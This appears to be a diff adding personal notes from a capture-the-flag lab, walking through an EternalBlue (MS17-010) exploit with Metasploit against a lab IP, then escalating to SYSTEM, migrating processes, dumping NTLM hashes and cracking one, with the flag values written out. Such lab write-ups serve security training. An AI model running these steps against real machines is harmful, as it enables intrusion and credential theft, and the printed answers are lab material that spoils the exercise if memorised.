@@ -1,0 +1,52 @@
+#vulnerability found 
+smb-ms17-010
+
+#msfconsole
+
+search ms17-010
+
+exploit/windows/smb/ms17_010_eternalblue
+
+#set RHOSTS
+10.10.63.81
+
+#run
+
+#ctrl+z/background it
+
+#sessios to see background 
+
+# use multi/manage/shell_to_meterpreter
+
+# set LPORT 1256
+#set session 1
+#run
+
+
+#run getsystem
+
+#check pwd
+
+
+nt authority\system
+
+#ps
+
+#migrate process_id //generally goto cmd or powershell
+
+#flag1
+flag{access_the_machine}
+
+#hashdump command gives
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
+
+use john ripper to crack paasword of john and it is final flag
+
+#flag2
+alqfna22
+
+
+
+
